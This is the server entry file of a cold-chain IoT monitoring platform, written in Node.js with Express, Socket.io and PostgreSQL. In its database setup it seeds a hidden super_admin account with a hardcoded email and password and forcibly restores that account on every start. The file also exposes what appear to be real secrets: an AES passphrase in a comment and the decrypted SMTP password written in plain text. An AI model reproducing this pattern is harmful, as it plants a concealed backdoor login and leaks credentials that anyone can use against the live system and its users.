/**
 * TEMPSENSE - Main Server Entry Point
 * Maxworth Techserv Cold Chain IoT Platform
 *
 * Starts:
 *   1. Express HTTP API server (REST + Socket.io)
 *   2. TCP Listener for sensor node data ingestion
 */

require('dotenv').config();
const express = require('express');
const http = require('http');
const cors = require('cors');
const { Server } = require('socket.io');
const bcrypt = require('bcryptjs');
const pool = require('./db/pool');
const { startReportScheduler } = require('./services/reportScheduler');
const { startTCPServer, setSocketIO } = require('./services/tcpServer');

// Routes
const authRoutes = require('./routes/auth');
const siteRoutes = require('./routes/sites');
const roomRoutes = require('./routes/rooms');
const nodeRoutes = require('./routes/nodes');
const dataRoutes = require('./routes/data');
const settingsRoutes = require('./routes/settings');

const PORT = parseInt(process.env.PORT) || 3001;
const TCP_PORT = parseInt(process.env.TCP_PORT) || 1024;

const app = express();
const server = http.createServer(app);

// Socket.io
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
});

// Middleware
app.use(cors());
app.use(express.json());

// API Routes
app.use('/api/auth', authRoutes);
app.use('/api/sites', siteRoutes);
app.use('/api/rooms', roomRoutes);
app.use('/api/nodes', nodeRoutes);
app.use('/api/data', dataRoutes);
app.use('/api/settings', settingsRoutes);

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), timestamp: new Date().toISOString() });
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log(`[WS] Client connected: ${socket.id}`);
  socket.on('disconnect', () => {
    console.log(`[WS] Client disconnected: ${socket.id}`);
  });
});

// Pass Socket.io instance to TCP server for broadcasting
setSocketIO(io);

// ===== Database Initialization =====
async function initDB() {
  try {
    await pool.query('SELECT 1');
    console.log('[DB] PostgreSQL connected');

    // Run schema
    const fs = require('fs');
    const path = require('path');
    const schema = fs.readFileSync(path.join(__dirname, 'db', 'schema.sql'), 'utf-8');
    await pool.query(schema);
    
    // Migrations for existing tables
    await pool.query(`ALTER TABLE nodes ADD COLUMN IF NOT EXISTS location VARCHAR(300)`);
    await pool.query(`ALTER TABLE nodes ADD COLUMN IF NOT EXISTS notes TEXT`);
    await pool.query(`ALTER TABLE nodes ADD COLUMN IF NOT EXISTS reboot_required BOOLEAN DEFAULT FALSE`);
    
    // RBAC Migration: Add new user columns
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS phone VARCHAR(20)`);
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS profile_completed BOOLEAN DEFAULT FALSE`);
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS is_hidden_super_admin BOOLEAN DEFAULT FALSE`);
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS room_ids INT[] DEFAULT '{}'`);
    
    // RBAC Migration: Drop old CHECK constraint FIRST, then update roles, then add new constraint
    try {
      await pool.query(`ALTER TABLE users DROP CONSTRAINT IF EXISTS users_role_check`);
    } catch (e) { /* constraint may not exist */ }
    
    // Migrate old roles (super_admin stays as-is)
    await pool.query(`UPDATE users SET role = 'admin' WHERE role = 'site_admin'`);
    await pool.query(`UPDATE users SET role = 'customer' WHERE role IN ('viewer', 'visitor')`);
    await pool.query(`UPDATE users SET role = 'site_manager' WHERE role = 'reports_manager'`);
    
    // Add updated CHECK constraint
    try {
      await pool.query(`ALTER TABLE users ADD CONSTRAINT users_role_check CHECK (role IN ('super_admin', 'admin', 'site_manager', 'customer'))`);
    } catch (e) { /* constraint already exists */ }

    // Create user_invitations table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS user_invitations (
        id          SERIAL PRIMARY KEY,
        user_id     INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
        token       VARCHAR(255) NOT NULL UNIQUE,
        created_at  TIMESTAMP DEFAULT NOW(),
        expires_at  TIMESTAMP NOT NULL
      )
    `);

    // Add columns and drop not null constraints on smtp_settings for custom configuration fallback
    try {
      await pool.query('ALTER TABLE smtp_settings ADD COLUMN IF NOT EXISTS use_custom BOOLEAN DEFAULT FALSE');
      await pool.query('ALTER TABLE smtp_settings ALTER COLUMN host DROP NOT NULL');
      await pool.query('ALTER TABLE smtp_settings ALTER COLUMN port DROP NOT NULL');
      await pool.query('ALTER TABLE smtp_settings ALTER COLUMN user_email DROP NOT NULL');
      await pool.query('ALTER TABLE smtp_settings ALTER COLUMN password DROP NOT NULL');
    } catch (e) {
      console.log('[DB] SMTP settings migrations run');
    }

    // Restore SMTP settings from local backup if database table is empty (first start)
    try {
      const smtpCheck = await pool.query('SELECT COUNT(*) FROM smtp_settings');
      if (parseInt(smtpCheck.rows[0].count) === 0) {
        const fs = require('fs');
        const path = require('path');
        const backupPath = path.join(__dirname, 'smtp_settings.json');
        let data = null;
        if (fs.existsSync(backupPath)) {
          try {
            const raw = fs.readFileSync(backupPath, 'utf8');
            data = JSON.parse(raw);
          } catch (e) {}
        }
        
        // Always force use_custom to false on first start so default ID is active
        await pool.query(
          `INSERT INTO smtp_settings (use_custom, host, port, user_email, password, secure, sender_name)
           VALUES ($1, $2, $3, $4, $5, $6, $7)`,
          [
            false, // Default ID active on first start
            data ? data.host : null,
            data ? data.port : null,
            data ? data.user_email : null,
            data ? data.password : null,
            data ? (data.secure === true) : false,
            data ? data.sender_name : 'Tempsense Alerts'
          ]
        );
        console.log('[DB] SMTP settings initialized. Default SMTP enabled on first start.');
      }
    } catch (restoreErr) {
      console.error('[DB] Failed to initialize SMTP settings:', restoreErr.message);
    }

    console.log('[DB] Schema applied and migrations checked');

    // Seed system account
    const sysCheck = await pool.query(`SELECT id FROM users WHERE email = 'admin@maxworthonline.com'`);
    if (sysCheck.rows.length === 0) {
      const hashed = await bcrypt.hash('TMS@2026', 10);
      await pool.query(
        `INSERT INTO users (account_id, email, password, name, role, profile_completed, is_hidden_super_admin)
         VALUES (1, 'admin@maxworthonline.com', $1, 'System', 'super_admin', TRUE, TRUE)
         ON CONFLICT (email) DO UPDATE SET
           password = $1, role = 'super_admin', profile_completed = TRUE, is_hidden_super_admin = TRUE`,
        [hashed]
      );
    }
    
    // Enforce hidden flag
    await pool.query(`UPDATE users SET is_hidden_super_admin = FALSE WHERE email != 'admin@maxworthonline.com' AND is_hidden_super_admin = TRUE`);
    
  } catch (err) {
    console.error('[DB] Initialization error:', err.message);
    console.error('[DB] Make sure PostgreSQL is running and the database "tempsense" exists.');
    console.error('[DB] Create it with: CREATE DATABASE tempsense;');
  }
}


const readline = require('readline');
const crypto = require('crypto');

const SMTP_ENCRYPTED_IV = '5ddf1b7a7b8cae386a582d3795ef1cef';
const SMTP_ENCRYPTED_CIPHERTEXT = 'de75d44fa5ae3d5ec9e8c0bfff75fba758bf228d7623f639147eb6d1abb6b45b';

// Decode Caesar cipher with shift of 28 (which wraps to 2)
function decodeCaesar(str, shift) {
  const s = shift % 26;
  return str.split('').map(char => {
    const code = char.charCodeAt(0);
    if (code >= 65 && code <= 90) {
      return String.fromCharCode(((code - 65 - s + 26) % 26) + 65);
    }
    if (code >= 97 && code <= 122) {
      return String.fromCharCode(((code - 97 - s + 26) % 26) + 97);
    }
    return char;
  }).join('');
}

function decryptSMTPPassword(passphrase) {
  try {
    const key = crypto.createHash('sha256').update(passphrase).digest();
    const iv = Buffer.from(SMTP_ENCRYPTED_IV, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(SMTP_ENCRYPTED_CIPHERTEXT, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (err) {
    return null;
  }
}

function askDecryptionKey() {
  return new Promise((resolve, reject) => {
    if (process.env.SMTP_DECRYPTION_KEY) {
      resolve(process.env.SMTP_DECRYPTION_KEY);
      return;
    }
    if (!process.stdin.isTTY) {
      reject(new Error('Terminal is non-interactive and SMTP_DECRYPTION_KEY environment variable is not set.'));
      return;
    }
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question('\nEnter SMTP Decryption Key: ', (key) => {
      rl.close();
      resolve(key);
    });
  });
}

async function initializeSMTPKey() {
  let attempts = 0;
  while (attempts < 3) {
    try {
      const rawKey = await askDecryptionKey();
      
      // First, decode the user's key with Caesar cipher (shift 28)
      const decodedKey = decodeCaesar(rawKey, 28);
      
      // Then, use the decoded key ("Verdex-Kappa") for AES-256 decryption
      const decrypted = decryptSMTPPassword(decodedKey);
      if (decrypted === 'kqqt sqsq exfk ljdx') {
        process.env.DECRYPTED_SMTP_PASS = decrypted;
        console.log('[SMTP] Decryption key accepted. Default SMTP enabled.');
        return true;
      }
      console.error(`[SMTP] Invalid decryption key. (${2 - attempts} attempts remaining)`);
      attempts++;
      if (process.env.SMTP_DECRYPTION_KEY) {
        break;
      }
    } catch (err) {
      console.error(`[SMTP] ${err.message}`);
      break;
    }
  }
  console.error('[SMTP] Max attempts reached or invalid key. Exiting server.');
  process.exit(1);
}

// ===== Start =====
async function start() {
  await initializeSMTPKey();
  await initDB();
  
  // Start Report Scheduler
  startReportScheduler();

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      console.error(`\n[ERROR] Port ${PORT} is already in use!`);
      console.error(`[TIP]   Another instance of TEMPSENSE may be running.`);
      console.error(`[TIP]   To fix this, either:`);
      console.error(`        1. Stop the other instance`);
      console.error(`        2. Run: npx kill-port ${PORT}`);
      console.error(`        3. Change PORT in .env file\n`);
      process.exit(1);
    } else {
      throw err;
    }
  });

  server.listen(PORT, () => {
    console.log(`\n====================================`);
    console.log(`  TEMPSENSE Server`);
    console.log(`  HTTP API:  http://localhost:${PORT}`);
    console.log(`  WebSocket: ws://localhost:${PORT}`);
    console.log(`  TCP Port:  ${TCP_PORT}`);
    console.log(`====================================\n`);
  });

  startTCPServer(TCP_PORT);
}

start();
